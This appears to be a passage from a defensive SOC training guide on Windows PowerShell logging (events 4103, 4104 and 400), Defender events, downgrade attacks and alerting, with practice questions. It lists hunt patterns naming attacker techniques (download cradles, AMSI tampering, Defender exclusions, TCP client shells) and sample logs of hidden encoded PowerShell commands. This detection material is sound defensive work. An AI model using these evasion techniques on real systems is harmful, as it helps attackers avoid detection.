- `Where-Object { $_.Properties[3].Value -eq '...' }` — keep only those whose fourth property (`ScriptBlockId`) is our GUID. Properties are numbered from 0 in the order of `EventData`: 0 `MessageNumber`, 1 `MessageTotal`, 2 `ScriptBlockText`, 3 `ScriptBlockId`, 4 `Path`.
- `Sort-Object { $_.Properties[0].Value }` — put the pieces in `MessageNumber` order (events are returned newest first).
- `ForEach-Object { $_.Properties[2].Value }` — take just the text of each piece.
- `Out-File C:\IR\block.txt` — write the joined script to a file for reading — **do not** paste it into a console.

### Why "noisy" — and what to do about it { #ps-noise }

With script block logging on, every script that runs — logon scripts, management agents, Windows' own maintenance tasks, the PowerShell profile, the code inside built-in modules the first time they load — creates 4104 events. A single admin tool can produce thousands per hour. Practical answers:

- **Collect everything, alert on content.** Storage is cheaper than missing the one block that matters. In the SIEM, filter known-good agents by `Path` and by stable text, not by turning logging off.
- **Hunt for patterns**: `Level` 3 (Warning) events; `FromBase64String`, `-bxor`, `IEX`/`Invoke-Expression`, `DownloadString`/`DownloadFile`/`Invoke-WebRequest`, `Reflection.Assembly]::Load`, `VirtualAlloc`, `AmsiUtils`, `Set-MpPreference`, `Add-MpPreference -ExclusionPath`, `New-Object Net.Sockets.TCPClient`, long random-looking strings, and scripts that touch LSASS.
- **Raise the event log size.** The default PowerShell Operational log is small (about 15 MB) and rolls over quickly once script block logging is on — increase it (for example to 1 GB or more) or forward continuously.
- **Protect it.** Script blocks can contain secrets (passwords in scripts). Restrict who can read the logs in the SIEM, and consider *Protected Event Logging*, which encrypts the text with a certificate so only the collector can read it.

### Event 4103 and transcription { #4103 }

Module logging (4103) records each command **as it is executed**, with the parameter values bound at run time:

```text
EventID 4103  Microsoft-Windows-PowerShell/Operational  WS-031.corp.example
ContextInfo:
        Severity = Informational
        Host Name = ConsoleHost
        Host Application = powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4A...
        Command Name = New-Object
        Command Type = Cmdlet
        User = CORP\j.lee
        Shell ID = Microsoft.PowerShell
Payload:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Net.WebClient"
```

- `Host Application` — the command line of the hosting process, Base64 and all.
- `Command Name` / `Command Type` — which cmdlet or function ran.
- `User` — whose session.
- `Payload` — `CommandInvocation` lines name the command; `ParameterBinding` lines show each parameter **with its final value**, which can reveal URLs, file names or IPs that were assembled from fragments.

**Transcription** writes a text file per session (for example `C:\PSTranscripts\20261120\PowerShell_transcript.WS-031.Xk3a9Lm2.20261120163002.txt`) with a header (start time, user, machine, host application) followed by every command **and its output**. It is the only one of the three that shows what the attacker saw on screen — for example the list of domain admins their discovery command printed. Write transcripts to a folder users cannot modify, ideally a remote share where they can only add files.

### Downgrade attacks and PowerShell 7 { #ps-downgrade }

[Supplement] All of the logging above was introduced in PowerShell 5. **PowerShell 2.0** had none of it, and for years attackers simply ran `powershell.exe -Version 2 -Command ...` to escape it (ATT&CK **T1562.010**, Downgrade Attack). The tell-tale sign is the classic **event 400** in the `Windows PowerShell` log with `HostVersion=2.0` and `EngineVersion=2.0`. Microsoft has now **removed** the PowerShell 2.0 engine from Windows 11 (24H2) and Windows Server 2025, starting with updates in August–September 2025, so on those systems the trick no longer works. On older systems, remove the optional feature *Windows PowerShell 2.0 Engine* yourself and keep alerting on event 400 with version 2.0.

**PowerShell 7** (the separately installed, cross-platform version, `pwsh.exe`) has the same 4103/4104 events but writes them to its **own** channel, `PowerShellCore/Operational`, and reads its **own** policy settings. Machines with PowerShell 7 installed need that channel collected and the PowerShell 7 policy configured — otherwise an attacker can simply run `pwsh.exe` instead of `powershell.exe`. Other hosts of the PowerShell engine (custom `.NET` programs loading `System.Management.Automation.dll`, so-called "PowerShell without powershell.exe") still produce 4104 when script block logging is on, because the logging is in the engine, not in the `.exe`.

## Putting it to work in a SOC { #soc-use }

- **Collect the channels.** Security (4720–4767, 4781, 4727–4737, 4754–4758), `Microsoft-Windows-Windows Defender/Operational`, `Microsoft-Windows-PowerShell/Operational`, `Windows PowerShell` (400/800) and, where PowerShell 7 exists, `PowerShellCore/Operational`. From **all** domain controllers.
- **Alert, high confidence:** any member added to `Administrators` (S-1-5-32-544), `Domain Admins`, `Enterprise Admins`, `Schema Admins`, `Backup Operators`, `Account Operators`, `DnsAdmins`, by SID and across 4732/4728/4756; a 4720 followed by an admin-group add from the same `SubjectLogonId`; non-empty `SidHistory`; Defender 5001/5013, 5007 adding an exclusion, 1118/1119 failed actions, any `HackTool`, `Exploit`, `Backdoor` or `Ransom` detection; 4104 with `Level` 3 or the hunt patterns above; 400 with `HostVersion=2.0`.
- **Stack and review the rest:** new local accounts per host (most fleets should have zero), group changes per subject, Defender detections by type and host, 4104 blocks by hash of the text — rare blocks seen on one host are worth reading.
- **Join across events:** `SubjectLogonId` → 4624; 4104 `ProcessID` → 4688/Sysmon 1 parent; Defender `Detection ID` 1116 → 1117; Defender detection time → process, logon and network events seconds before.
- **Mind the time:** XML `SystemTime` is UTC; rendered messages and `Get-MpThreatDetection` show local time.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid as is"
    4720, 4722–4726, 4738, 4732/4728/4756 and their removal counterparts, with the same fields, are unchanged on Windows 11 and Windows Server 2025, and account creation plus admin-group membership remains a routine step in hands-on-keyboard intrusions and ransomware cases. Defender's Operational channel and event IDs 1116/1117, 1006/1007, 5001, 5007 and 5013 are still current. Script block logging (4104) and module logging (4103) behave as described and remain among the most valuable Windows logs for investigations; the output is still not captured by 4104, so transcription still matters.

!!! info "[Changed] What has changed"
    - **Names.** "Windows Defender ATP" became **Microsoft Defender for Endpoint**, part of **Microsoft Defender XDR** (formerly Microsoft 365 Defender), managed in the unified Microsoft Defender portal together with Microsoft Sentinel. The antivirus itself is **Microsoft Defender Antivirus**, although event channel and folder names still say "Windows Defender".
    - **Tamper protection** is on by default for home users and for new Defender for Endpoint tenants, so attempts to disable Defender now more often show up as **5013** than as a successful 5001. Attackers have shifted to abusing exclusions, using vulnerable drivers to kill security tools, or targeting machines where Defender is in passive mode under another vendor's EDR.
    - **PowerShell 2.0 is gone** from Windows 11 24H2 and Windows Server 2025 (removed from August–September 2025 updates), which closes the classic downgrade path on those versions. Older systems still need the feature removed manually.
    - **ATT&CK mapping.** Account creation T1136.001/.002, adding to privileged groups **T1098.007** (sub-technique added in 2024), PowerShell T1059.001, command obfuscation T1027.010, disabling Defender T1562.001, PowerShell downgrade T1562.010.
    - **Identity attacks moved to the cloud too.** In hybrid environments, creating accounts or adding role assignments in Microsoft Entra ID (formerly Azure AD) is the cloud equivalent of 4720/4728 — it is recorded in Entra audit logs, not the Windows Security log, and needs its own collection.

!!! warning "[Caution] Wrong or risky if done the old way"
    - **Do not watch only 4728.** Built-in Administrators on a DC is 4732, Enterprise Admins is 4756.
    - **Do not match on `MemberName` or on English group names.** Use `MemberSid` and the group's `TargetSid`.
    - **Do not collect from one DC.** Each change is written only on the DC that processed it.
    - **Do not close a Defender alert because the action succeeded.** Find out how it arrived, whether it ran and what else is there — especially for `HackTool` detections.
    - **Do not ignore 5007.** A new exclusion is often the moment just before the real tools arrive.
    - **Do not assume 4104 covers PowerShell 7 or shows output.** Collect `PowerShellCore/Operational`, and use transcription for output.
    - **Do not turn script block logging off because it is noisy.** Increase the log size, forward it, and filter in the SIEM.
    - **Do not paste reassembled attacker code into a console.** Read it as text.

## Practice questions { #quiz }

### Question 1

On domain controller `DC-01` you find a 4732 with `TargetUserName` `Administrators`, `TargetDomainName` `Builtin`, `TargetSid` `S-1-5-32-544`, `MemberName` `CN=Backup Svc,OU=Service Accounts,DC=corp,DC=example`, Subject `CORP\it.ops3`. Your colleague says "4732 means a local group on one machine, so this only affects DC-01 — low priority." Is that right? What do you do?

??? success "Answer and explanation"
    No. On a domain controller there are no "local" groups in the normal sense: `BUILTIN\Administrators` on a DC is a **domain local** group stored in Active Directory and shared by **all domain controllers**. Its members are administrators of every DC, which effectively means control of the whole domain — as powerful as Domain Admins. That is why the event is 4732 (domain local scope), not 4728 (global, for example Domain Admins).

    `MemberName` is filled in this time because the member is an AD object (`Backup Svc` in the Service Accounts OU); `MemberSid` identifies it exactly. **Next:** treat it as high priority (T1098.007). Check whether a change ticket exists for `it.ops3`; find the 4624 for `SubjectLogonId` (logon type and source); check whether the `Backup Svc` account was recently created (4720 on any DC) or changed (4738, password reset 4724); look for its logons since the change; and remove it from the group if not approved, after preserving evidence.

### Question 2

On `WS-044` within ten minutes you see: Defender **5007** where the new value is `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ProgramData\Sync = 0x0`; then **4104** (Level 3) containing `Add-MpPreference -ExclusionPath 'C:\ProgramData\Sync'`; then **1116** with `Threat Name` `Behavior:Win32/...`, `Path` `process:_pid:6120`; and no file detections in `C:\ProgramData\Sync`. Explain what happened and why there were no file detections.

??? success "Answer and explanation"
    Someone ran PowerShell (`Add-MpPreference -ExclusionPath`) to tell Defender to **stop scanning** `C:\ProgramData\Sync` — T1562.001, Impair Defenses. 4104 recorded the command text (Warning level because it touches Defender settings), and 5007 recorded the resulting configuration change (the new registry value under `Exclusions\Paths`). Running this needs admin rights, so the actor already had them.

    Files in an excluded path are **not scanned**, so tools dropped there produce no 1116 file detections — exactly what the attacker wanted. The **behaviour** detection (`Behavior:`, a running process `pid:6120`) still fired because behaviour monitoring watches what processes do, not just files on disk. **Next:** find PID 6120 in 4688/Sysmon 1 (its image path — likely in the excluded folder — parent and command line), find the PowerShell process behind the 4104 (`Execution ProcessID`) and its parent, list and hash files in `C:\ProgramData\Sync`, remove the exclusion, and check other hosts for the same 5007. Also note why tamper protection did not stop it: it does not protect exclusions unless they are managed centrally (for example through Intune) with the settings that make them tamper-protected.

### Question 3

A 4688 on `WS-031` shows `powershell.exe -nop -w hidden -enc JABzAD0A...` with parent `WINWORD.EXE`. The PowerShell Operational log on that host has only a handful of `Level` 5 events from a management agent around that time, no 4104 matching the encoded command, and the `Windows PowerShell` log has an event 400 with `HostVersion=2.0`. Explain what you are looking at, and what it tells you about the host's configuration.

??? success "Answer and explanation"
    Word starting a hidden PowerShell with an encoded command is a classic malicious document chain (T1566.001 → T1059.001). Normally script block logging would show the decoded code in a 4104. The missing 4104 plus event **400 with `HostVersion=2.0`** shows the payload started PowerShell **version 2** (for example with `-Version 2` or by calling the v2 engine), which has **no** script block or module logging — a **downgrade attack** (T1562.010). The encoded command never reached a logging-capable engine.

    It tells you the host still has the **Windows PowerShell 2.0 engine** installed (so it is not an up-to-date Windows 11 24H2 / Server 2025 build, or the feature was re-added) and that alerting on event 400 with version 2.0 was not in place. **Next:** decode the Base64 from the 4688 command line yourself (UTF-16LE) in an analysis environment to see the command; look at network logs for the download; follow the child processes of that PowerShell; and as a fix, remove the PowerShell 2.0 feature fleet-wide and add the event 400 alert.

## Related { #related }

- [Important Events](index.md) — this section's overview
- [Login events](logins.md) — the logon behind `SubjectLogonId`; lock-outs and password spraying
- [Process creation events](process-creation.md) — `net.exe`, `powershell.exe` and their parents
- [Service, scheduled task and USB events](services-tasks-usb.md) — other persistence an attacker adds next to an account
- [Windows event structure and channels](../windows-logging/event-structure-channels.md) — `%%` message codes and why Defender and PowerShell have their own channels
- [Execution, persistence and discovery](../endpoint-attacks/execution-persistence-discovery.md) — PowerShell execution and account persistence from the attacker side
- [Credential dumping and Mimikatz](../endpoint-attacks/credential-dumping-mimikatz.md) — what a `HackTool` detection may mean
- [VBS, host firewalls and antivirus](../endpoint-defense/vbs-firewall-antivirus.md) — antivirus as a defensive layer
- [PAWs, EDR, DLP and UEBA](../endpoint-defense/paw-edr-dlp-ueba.md) — EDR telemetry beyond these events
- [Windows Event IDs](../../../basics/windows-event-ids.md)
- [Windows Event Logs (EVTX)](../../../windows/event-logs.md)
